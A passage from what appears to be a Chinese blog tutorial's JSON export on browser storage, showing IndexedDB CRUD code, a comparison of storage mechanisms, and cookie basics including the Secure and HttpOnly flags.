store）。它类似于关系型数据库的表格。</p>\n</li>\n<li><p>数据记录<br>对象仓库保存的是数据记录。每条记录类似于关系型数据库的行，但是只有主键和数据体两部分。主键用来建立默认的索引，必须是不同的，否则会报错。主键可以是数据记录里面的一个属性，也可以指定为一个递增的整数编号。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123; id: 1, text: &#x27;foo&#x27; &#125;</span><br></pre></td></tr></table></figure></li>\n<li><p>索引： IDBIndex 对象<br>为了加速数据的检索，可以在对象仓库里面，为不同的属性建立索引。</p>\n</li>\n<li><p>事务： IDBTransaction 对象<br>数据记录的读写和删改，都要通过事务完成。事务对象提供 error、abort 和 complete 三个事件，用来监听操作结果。</p>\n</li>\n<li><p>操作请求：IDBRequest 对象</p>\n</li>\n<li><p>指针： IDBCursor 对象</p>\n</li>\n<li><p>主键集合：IDBKeyRange 对象</p>\n</li>\n</ul>\n<h2 id=\"3-IndexedDB-的常见操作\"><a href=\"#3-IndexedDB-的常见操作\" class=\"headerlink\" title=\"3.IndexedDB 的常见操作\"></a>3.IndexedDB 的常见操作</h2><p>在 IndexedDB 大部分操作并不是我们常用的调用方法，返回结果的模式，而是请求——响应的模式。<br>建立打开 IndexedDB —- <strong>window.indexedDB.open(“testDB”)</strong></p>\n<p>操作流程：</p>\n<h4 id=\"3-1-打开数据库\"><a href=\"#3-1-打开数据库\" class=\"headerlink\" title=\"3.1.打开数据库\"></a>3.1.打开数据库</h4><p>使用 IndexedDB 的第一步是打开数据库，使用 indexedDB.open()方法。</p>\n<p><strong>window.indexedDB.open(databaseName, version)</strong><br>这个方法接受两个参数，第一个参数是字符串，表示数据库的名字。如果指定的数据库不存在，就会新建数据库。第二个参数是整数，表示数据库的版本。如果省略，打开已有数据库时，默认为当前版本；新建数据库时，默认为 1。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var request = window.indexedDB.open(&quot;testDB&quot;, version);</span><br></pre></td></tr></table></figure>\n\n<p>indexedDB.open()方法返回一个 IDBOpenDBRequest 对象。这个对象通过三种事件 error、success、upgradeneeded，处理打开数据库的操作结果。</p>\n<p><img src=\"%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/indexDB.png\" alt=\"indexDB\"></p>\n<p>这条指令并不会返回一个 DB 对象的句柄，我们得到的是一个 <strong>IDBOpenDBRequest 对象</strong>，而我们希望得到的 DB 对象在其 result 属性中</p>\n<p>除了 result，IDBOpenDBRequest 接口定义了几个重要属性:</p>\n<p>onerror: 请求失败的回调函数句柄</p>\n<p>onsuccess:请求成功的回调函数句柄</p>\n<p>onupgradeneeded:请求数据库版本变化句柄</p>\n<ul>\n<li>error 事件表示打开数据库失败。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">request.onerror = function (event) &#123;</span><br><span class=\"line\">  console.log(&#x27;数据库打开报错&#x27;);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>success 事件表示成功打开数据库。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var db;</span><br><span class=\"line\">request.onsuccess = function (event) &#123;</span><br><span class=\"line\">  db = request.result;</span><br><span class=\"line\">  console.log(&#x27;数据库打开成功&#x27;);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>这时，通过 request 对象的 result 属性拿到数据库对象。</p>\n<ul>\n<li>upgradeneeded 事件</li>\n</ul>\n<p>如果指定的版本号，大于数据库的实际版本号，就会发生数据库升级事件 upgradeneeded。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var db;</span><br><span class=\"line\">request.onupgradeneeded = function (event) &#123;</span><br><span class=\"line\">  db = event.target.result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这时通过事件对象的 target.result 属性，拿到数据库实例。</p>\n<h4 id=\"3-2-新建数据库\"><a href=\"#3-2-新建数据库\" class=\"headerlink\" title=\"3.2.新建数据库\"></a>3.2.新建数据库</h4><p><strong>createObjectStore</strong><br>新建数据库与打开数据库是同一个操作。如果指定的数据库不存在，就会新建。不同之处在于，后续的操作主要在 upgradeneeded 事件的监听函数里面完成，因为这时版本从无到有，所以会触发这个事件。</p>\n<p>通常，新建数据库以后，第一件事是新建对象仓库（即新建表）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">request.onupgradeneeded = function(event) &#123;</span><br><span class=\"line\">  db = event.target.result;</span><br><span class=\"line\">  var objectStore = db.createObjectStore(&#x27;person&#x27;, &#123; keyPath: &#x27;id&#x27; &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面代码中，数据库新建成功以后，新增一张叫做 person 的表格，主键是 id。<br>更好的写法是先判断一下，这张表格是否存在，如果不存在再新建。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">request.onupgradeneeded = function (event) &#123;</span><br><span class=\"line\">  db = event.target.result;</span><br><span class=\"line\">  var objectStore;</span><br><span class=\"line\">  if (!db.objectStoreNames.contains(&#x27;person&#x27;)) &#123;</span><br><span class=\"line\">    objectStore = db.createObjectStore(&#x27;person&#x27;, &#123; keyPath: &#x27;id&#x27; &#125;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>主键（key）是默认建立索引的属性。比如，数据记录是{ id: 1, name: ‘张三’ }，那么 id 属性可以作为主键。主键也可以指定为下一层对象的属性，比如{ foo: { bar: ‘baz’ } }的 foo.bar 也可以指定为主键。</p>\n<p>如果数据记录里面没有合适作为主键的属性，那么可以让 IndexedDB 自动生成主键。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var objectStore = db.createObjectStore(</span><br><span class=\"line\">  &#x27;person&#x27;,</span><br><span class=\"line\">  &#123; autoIncrement: true &#125;</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n<p>上面代码中，指定主键为一个递增的整数。</p>\n<p>新建对象仓库以后，下一步可以新建索引。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">request.onupgradeneeded = function(event) &#123;</span><br><span class=\"line\">  db = event.target.result;</span><br><span class=\"line\">  var objectStore = db.createObjectStore(&#x27;person&#x27;, &#123; keyPath: &#x27;id&#x27; &#125;);</span><br><span class=\"line\">  objectStore.createIndex(&#x27;name&#x27;, &#x27;name&#x27;, &#123; unique: false &#125;);</span><br><span class=\"line\">  objectStore.createIndex(&#x27;email&#x27;, &#x27;email&#x27;, &#123; unique: true &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面代码中，**IDBObject.createIndex()**的三个参数分别为索引名称、索引所在的属性、配置对象（说明该属性是否包含重复的值）。</p>\n<h4 id=\"3-3-新增数据\"><a href=\"#3-3-新增数据\" class=\"headerlink\" title=\"3.3.新增数据\"></a>3.3.新增数据</h4><p>新增数据指的是向对象仓库写入数据记录。这需要通过事务完成。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function add() &#123;</span><br><span class=\"line\">  var request = db.transaction([&#x27;person&#x27;], &#x27;readwrite&#x27;)</span><br><span class=\"line\">    .objectStore(&#x27;person&#x27;)</span><br><span class=\"line\">    .add(&#123; id: 1, name: &#x27;张三&#x27;, age: 24, email: &#x27;zhangsan@example.com&#x27; &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  request.onsuccess = function (event) &#123;</span><br><span class=\"line\">    console.log(&#x27;数据写入成功&#x27;);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  request.onerror = function (event) &#123;</span><br><span class=\"line\">    console.log(&#x27;数据写入失败&#x27;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">add();</span><br></pre></td></tr></table></figure>\n\n<p>上面代码中，写入数据需要新建一个事务。新建时必须指定表格名称和操作模式（”只读”或”读写”）。新建事务以后，通过 **IDBTransaction.objectStore(name)**方法，拿到 IDBObjectStore 对象，再通过表格对象的 add()方法，向表格写入一条记录。</p>\n<p>写入操作是一个异步操作，通过监听连接对象的 success 事件和 error 事件，了解是否写入成功。</p>\n<h4 id=\"3-4-读取数据\"><a href=\"#3-4-读取数据\" class=\"headerlink\" title=\"3.4.读取数据\"></a>3.4.读取数据</h4><p>读取数据也是通过事务完成。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function read() &#123;</span><br><span class=\"line\">   var transaction = db.transaction([&#x27;person&#x27;]);</span><br><span class=\"line\">   var objectStore = transaction.objectStore(&#x27;person&#x27;);</span><br><span class=\"line\">   var request = objectStore.get(1);</span><br><span class=\"line\"></span><br><span class=\"line\">   request.onerror = function(event) &#123;</span><br><span class=\"line\">     console.log(&#x27;事务失败&#x27;);</span><br><span class=\"line\">   &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">   request.onsuccess = function( event) &#123;</span><br><span class=\"line\">      if (request.result) &#123;</span><br><span class=\"line\">        console.log(&#x27;Name: &#x27; + request.result.name);</span><br><span class=\"line\">        console.log(&#x27;Age: &#x27; + request.result.age);</span><br><span class=\"line\">        console.log(&#x27;Email: &#x27; + request.result.email);</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        console.log(&#x27;未获得数据记录&#x27;);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">read();</span><br></pre></td></tr></table></figure>\n\n<p>上面代码中，**objectStore.get()**方法用于读取数据，参数是主键的值。</p>\n<h4 id=\"3-5-遍历数据\"><a href=\"#3-5-遍历数据\" class=\"headerlink\" title=\"3.5.遍历数据\"></a>3.5.遍历数据</h4><p>遍历数据表格的所有记录，要使用指针对象 IDBCursor。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function readAll() &#123;</span><br><span class=\"line\">  var objectStore = db.transaction(&#x27;person&#x27;).objectStore(&#x27;person&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">   objectStore.openCursor().onsuccess = function (event) &#123;</span><br><span class=\"line\">     var cursor = event.target.result;</span><br><span class=\"line\"></span><br><span class=\"line\">     if (cursor) &#123;</span><br><span class=\"line\">       console.log(&#x27;Id: &#x27; + cursor.key);</span><br><span class=\"line\">       console.log(&#x27;Name: &#x27; + cursor.value.name);</span><br><span class=\"line\">       console.log(&#x27;Age: &#x27; + cursor.value.age);</span><br><span class=\"line\">       console.log(&#x27;Email: &#x27; + cursor.value.email);</span><br><span class=\"line\">       cursor.continue();</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">      console.log(&#x27;没有更多数据了！&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">readAll();</span><br></pre></td></tr></table></figure>\n\n<p>上面代码中，新建指针对象的<strong>openCursor()方法</strong>是一个异步操作，所以要监听 success 事件。</p>\n<h4 id=\"3-6-更新数据\"><a href=\"#3-6-更新数据\" class=\"headerlink\" title=\"3.6.更新数据\"></a>3.6.更新数据</h4><p>更新数据要使用<strong>IDBObject.put()方法</strong>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function update() &#123;</span><br><span class=\"line\">  var request = db.transaction([&#x27;person&#x27;], &#x27;readwrite&#x27;)</span><br><span class=\"line\">    .objectStore(&#x27;person&#x27;)</span><br><span class=\"line\">    .put(&#123; id: 1, name: &#x27;李四&#x27;, age: 35, email: &#x27;lisi@example.com&#x27; &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  request.onsuccess = function (event) &#123;</span><br><span class=\"line\">    console.log(&#x27;数据更新成功&#x27;);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  request.onerror = function (event) &#123;</span><br><span class=\"line\">    console.log(&#x27;数据更新失败&#x27;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">update();</span><br></pre></td></tr></table></figure>\n\n<p>上面代码中，put()方法自动更新了主键为 1 的记录。</p>\n<h4 id=\"3-7-删除数据\"><a href=\"#3-7-删除数据\" class=\"headerlink\" title=\"3.7.删除数据\"></a>3.7.删除数据</h4><p><strong>IDBObjectStore.delete()方法</strong>用于删除记录。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function remove() &#123;</span><br><span class=\"line\">  var request = db.transaction([&#x27;person&#x27;], &#x27;readwrite&#x27;)</span><br><span class=\"line\">    .objectStore(&#x27;person&#x27;)</span><br><span class=\"line\">    .delete(1);</span><br><span class=\"line\"></span><br><span class=\"line\">  request.onsuccess = function (event) &#123;</span><br><span class=\"line\">    console.log(&#x27;数据删除成功&#x27;);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">remove();</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-8-使用索引\"><a href=\"#3-8-使用索引\" class=\"headerlink\" title=\"3.8.使用索引\"></a>3.8.使用索引</h4><p>索引的意义在于，可以让你搜索任意字段，也就是说从任意字段拿到数据记录。如果不建立索引，默认只能搜索主键（即从主键取值）。</p>\n<p>假定新建表格的时候，对 name 字段建立了索引。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">objectStore.createIndex(&#x27;name&#x27;, &#x27;name&#x27;, &#123; unique: false &#125;);</span><br></pre></td></tr></table></figure>\n\n<p>现在，就可以从 name 找到对应的数据记录了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var transaction = db.transaction([&#x27;person&#x27;], &#x27;readonly&#x27;);</span><br><span class=\"line\">var store = transaction.objectStore(&#x27;person&#x27;);</span><br><span class=\"line\">var index = store.index(&#x27;name&#x27;);</span><br><span class=\"line\">var request = index.get(&#x27;李四&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">request.onsuccess = function (e) &#123;</span><br><span class=\"line\">  var result = e.target.result;</span><br><span class=\"line\">  if (result) &#123;</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关闭-IndexDB\"><a href=\"#关闭-IndexDB\" class=\"headerlink\" title=\"关闭 IndexDB\"></a>关闭 IndexDB</h3><p><strong>indexdb.close()</strong></p>\n<h2 id=\"3-WebStorage、cookie-和-IndexedDB-之间的区别\"><a href=\"#3-WebStorage、cookie-和-IndexedDB-之间的区别\" class=\"headerlink\" title=\"3.WebStorage、cookie 和 IndexedDB 之间的区别\"></a>3.WebStorage、cookie 和 IndexedDB 之间的区别</h2><table>\n<thead>\n<tr>\n<th>特性</th>\n<th align=\"left\">cookie</th>\n<th align=\"left\">localstorage</th>\n<th align=\"left\">sessionstorage</th>\n<th align=\"left\">indexDB</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>数据生命周期</td>\n<td align=\"left\">一般有服务器生成，可以设置过期时间</td>\n<td align=\"left\">除非被清除，否则一直存在</td>\n<td align=\"left\">页面关闭就清理</td>\n<td align=\"left\">除非被清除，否则一直存在</td>\n</tr>\n<tr>\n<td>数据存储大小</td>\n<td align=\"left\">4K</td>\n<td align=\"left\">5M</td>\n<td align=\"left\">5M</td>\n<td align=\"left\">无限</td>\n</tr>\n<tr>\n<td>与服务端通信</td>\n<td align=\"left\">每次都会携带在 header 里，对于性能有很大影响</td>\n<td align=\"left\">不参与</td>\n<td align=\"left\">不参与</td>\n<td align=\"left\">不参与</td>\n</tr>\n</tbody></table>\n<p>从上表可以看到，cookie 已经不建议用于存储。如果没有大量数据存储需求的话，可以使用 localStorage 和 sessionStorage 。对于不怎么改变的数据尽量使用 localStorage 存储，否则可以用 sessionStorage 存储。</p>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><p>正是浏览器存储、缓存技术的出现和发展，为我们的前端应用带来了无限的转机。近年来基于存储、缓存技术的第三方库层出不绝，此外还衍生出了 PWA 这样优秀的 Web 应用模型。总结下本文几个核心观点：</p>\n<ul>\n<li>Cookie 的本职工作并非本地存储，而是“维持状态”</li>\n<li>Web Storage 是 HTML5 专门为浏览器存储而提供的数据存储机制，不与服务端发生通信</li>\n<li>IndexedDB 用于客户端存储大量结构化数据</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"浏览器存储有哪些？\"><a href=\"#浏览器存储有哪些？\" class=\"headerlink\" title=\"浏览器存储有哪些？\"></a>浏览器存储有哪些？</h1><ul>\n<li>Cookie</li>\n<li>LocalStorage</li>\n<li>SessionStorage</li>\n<li>IndexDB</li>\n</ul>\n<h1 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h1><h3 id=\"1-Cookie-的来源\"><a href=\"#1-Cookie-的来源\" class=\"headerlink\" title=\"1.Cookie 的来源\"></a>1.Cookie 的来源</h3><p><strong>Cookie 的本职工作并非本地存储，而是“维持状态”。</strong><br>因为 <strong>HTTP 协议是无状态的，HTTP 协议自身不对请求和响应之间的通信状态进行保存</strong>，通俗来说，服务器不知道用户上一次做了什么，这严重阻碍了交互式 Web 应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于 HTTP 的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，于是就诞生了 Cookie。它就是用来绕开 HTTP 的无状态性的“额外手段”之一。服务器可以设置或读取 Cookies 中包含信息，借此维护用户跟服务器会话中的状态。</p>\n<p>我们可以把 Cookie 理解为一个存储在浏览器里的一个小小的文本文件，它附着在 HTTP 请求上，在浏览器和服务器之间“飞来飞去”。它可以携带用户信息，当服务器检查 Cookie 的时候，便可以获取到客户端的状态。</p>\n<p>在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段 Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把 Cookie 发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段 Cookie 里追加新的商品信息。结帐时，服务器读取发送来的 Cookie 就行了。</p>\n<h3 id=\"2-什么是-Cookie-以及应用场景\"><a href=\"#2-什么是-Cookie-以及应用场景\" class=\"headerlink\" title=\"2.什么是 Cookie 以及应用场景\"></a>2.什么是 Cookie 以及应用场景</h3><p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。<br>Cookie 是一个请求首部，其中含有先前由服务器通过 Set-Cookie 首部投放并存储到客户端的 HTTP cookies。<br><strong>Cookie 指某些网站为了辨别用户身份而储存在用户本地终端上的数据(通常经过加密)。 cookie 是服务端生成，客户端进行维护和存储</strong>。通过 cookie,可以让服务器知道请求是来源哪个客户端，就可以进行客户端状态的维护，比如登陆后刷新，请求头就会携带登陆时 response header 中的 set-cookie,Web 服务器接到请求时也能读出 cookie 的值，根据 cookie 值的内容就可以判断和恢复一些用户的信息状态。</p>\n  <!-- 典型的应用场景有：\n\n  - 记住密码，下次自动登录。\n  - 购物车功能。\n  - 记录用户浏览数据，进行商品（广告）推荐。 -->\n\n<p>Cookie 主要用于以下三个方面：</p>\n<ul>\n<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>\n<li>个性化设置（如用户自定义设置、主题等）</li>\n<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>\n</ul>\n<h3 id=\"3-Cookie-的原理以及如何生成\"><a href=\"#3-Cookie-的原理以及如何生成\" class=\"headerlink\" title=\"3.Cookie 的原理以及如何生成\"></a>3.Cookie 的原理以及如何生成</h3><p>第一次访问网站的时候，浏览器发出请求，服务器响应请求后，会在响应头里面添加一个 Set-Cookie 选项，将 cookie 放入到响应请求中，在浏览器第二次发请求的时候，会通过 Cookie 请求头部将 Cookie 信息发送给服务器，服务端会辨别用户身份，另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p>\n<p>Cookie 的生成方式主要有两种：</p>\n<ul>\n<li>生成方式一：http response header 中的 set-cookie</li>\n</ul>\n<p>我们可以通过响应头里的 Set-Cookie 指定要存储的 Cookie 值。默认情况下，domain 被设置为设置 Cookie 页面的主机名，我们也可以手动设置 domain 的值。<br>服务器通过该头部告知客户端保存 Cookie 信息。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.0 200 OK</span><br><span class=\"line\">Content-type: text/html</span><br><span class=\"line\">Set-Cookie: yummy_cookie=choco</span><br><span class=\"line\">Set-Cookie: tasty_cookie=strawberry</span><br><span class=\"line\">[页面内容]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的 Cookie 信息通过 Cookie 请求头部再发送给服务器。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /sample_page.html HTTP/1.1</span><br><span class=\"line\">Host: www.example.org</span><br><span class=\"line\">Cookie: yummy_cookie=choco; tasty_cookie=strawberry</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"会话期-Cookie\"><a href=\"#会话期-Cookie\" class=\"headerlink\" title=\"会话期 Cookie\"></a>会话期 Cookie</h5><p>会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期 Cookie 不需要指定过期时间（Expires）或者有效期（Max-Age）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期 Cookie 也会被保留下来，就好像浏览器从来没有关闭一样。</p>\n<h5 id=\"持久性-Cookie\"><a href=\"#持久性-Cookie\" class=\"headerlink\" title=\"持久性 Cookie\"></a>持久性 Cookie</h5><p>和关闭浏览器便失效的会话期 Cookie 不同，持久性 Cookie 可以指定一个特定的过期时间（Expires）或有效期（Max-Age）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure>\n\n<p><strong>Tips:</strong> 当 Cookie 的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。</p>\n<h4 id=\"Cookie-的-Secure-和-HttpOnly-标记\"><a href=\"#Cookie-的-Secure-和-HttpOnly-标记\" class=\"headerlink\" title=\"Cookie 的 Secure 和 HttpOnly 标记\"></a>Cookie 的 Secure 和 HttpOnly 标记</h4><p>HttpOnly 不支持读写，浏览器不允许脚本操作 document.cookie 去更改 cookie， 所以为避免跨域脚本 (XSS) 攻击，通过 JavaScript 的 Document.cookie API 无法访问带有 HttpOnly 标记的 Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 HttpOnly 标记。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</span><br></pre></td></tr></table></figure>\n\n<p>标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http:）无法使用 Cookie 的 Secure 标记。</p>\n<ul>\n<li>生成方式二：js 中可以通过 document.cookie 可以读写 cookie，以键值对的形式展示</li>\n</ul>\n<p>例如我们在百度首页控制台输入以下三句代码，便可以在 Chrome 的 Application 面板查看生成的 cookie:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">document.cookie=&quot;name=hello&quot;;</span><br><span class=\"line\">document.cookie=&quot;age=18&quot;;</span><br><span class=\"line\">document.cookie=&quot;domain=google.com;gender=male&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img 